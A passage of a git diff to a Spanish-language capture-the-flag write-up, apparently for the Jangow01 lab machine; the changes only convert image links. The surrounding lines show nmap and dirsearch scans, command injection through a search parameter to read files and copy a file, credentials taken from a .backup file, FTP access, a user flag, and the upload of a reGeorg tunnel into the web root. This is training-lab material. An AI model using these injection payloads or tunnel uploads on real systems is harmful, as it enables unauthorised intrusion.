@@ -12,7 +12,7 @@ Una ves encontrada la IP de la maquina victima comenzamos a realizar un escaneo 
 ```
 sudo nmap -sV -A -T5 192.168.1.30
 ```
-- ![[nmap.png]]
+- ![Nmap](imagenes/nmap.png)
 - En el escaneo nos damos cuenta que tiene abierto el uerto 80 corriendo un servicio we con apache y el puerto 21 corriendo un servicio de FTP.
 
 Procedemos a verificar si existe un sitio WEB de la maquina entramos al navegador con el siguiente link:
@@ -20,9 +20,9 @@ Procedemos a verificar si existe un sitio WEB de la maquina entramos al navegado
 http://192.168.1.30/
 ```
 - Nos redirige al siguiente sitio en el cual nos damos cuenta que contiene una carpeta que nos redirecciona a la página web:
-	- ![[sitefolder.png]]
+	- ![Site Folder](imagenes/sitefolder.png)
 	- http://192.168.1.30/site/
-	- ![[paguina_inicio.png]]
+	- ![Página Inicio](imagenes/paguina_inicio.png)
 
 Revisamos el código de la página y encontramos un buscador en el siguiente link: http://192.168.1.30/site/busque.php?buscar=
 pero ademas utilizando la herramienta " dirsearch " realizamos una enumeración de directorios para encontrar directorios y archivos:
@@ -32,9 +32,9 @@ dirsearch -u http://192.168.1.30/
 
 Utilizando el link " http://192.168.1.30/site/busque.php?buscar=ls%20-al%20.. " recorriendo una carpeta atras y buscando archivos ocultos nos damos cuenta que podemos interactuar con comandos en el servidor, encontrando con un .backup:
 - VER CÓDIGO PHP: view-source:http://192.168.1.30/site/busque.php?buscar=cat busque.php
-- ![[link_buscar.png]]
+- ![Link Buscar](imagenes/link_buscar.png)
 De igual manera con al herramienta que utilizamos para enumerar los directorios " dirsearch " desucbrimos que detecto un archivo oculto seria el .backup:
-- ![[dirsearch.png]]
+- ![Dirsearch](imagenes/dirsearch.png)
 
 Podemos ingresar por medio de la url al " .backup " y veremos unas contraseñas las cuales podemos ver si nos conectamos por medio de ftp:
 - USERNAME: jangow01
@@ -42,7 +42,7 @@ Podemos ingresar por medio de la url al " .backup " y veremos unas contraseñas 
 ```
 http://192.168.1.30/.backup
 ```
-- ![[credenciales_backup.png]]
+- ![Credenciales Backup](imagenes/credenciales_backup.png)
 
 Nos conectamos por medio de ftp:
 ```
@@ -71,12 +71,12 @@ ls -al
 	cat user.txt
 ```
 - FLAG: d41d8cd98f00b204e9800998ecf8427e
-- ![[flagUSER.png]]
+- ![Flag User](imagenes/flagUSER.png)
 
 AHORA ES MOMENTO DE ELEVAR PRIVILEGIOS:
 Revisando la herramienta " [**reGeorg**](https://github.com/sensepost/reGeorg?ref=ciberseguridad.blog) " subiremos un tunel, crearemos un proxy:
 - ya que tenemos acceso por ftp utilizando la terminal o filezilla llevaremos " tunnel.nosocket.php " que se encuentra en la carpeta de la herramienta a la maquina victima en la carpeta " /temp "
-- ![[filezilla.png]]
+- ![Filezilla](imagenes/filezilla.png)
 - Procedemos a copiarlo a la siguiente ruta desde la web:
 	- http://192.168.1.30/site/busque.php?buscar=cp%20-v%20/tmp/tunnel.php%20/var/www/html/site/tunnel.php
 - Una ves subido podemos utilizar ahora " reGeorg ":
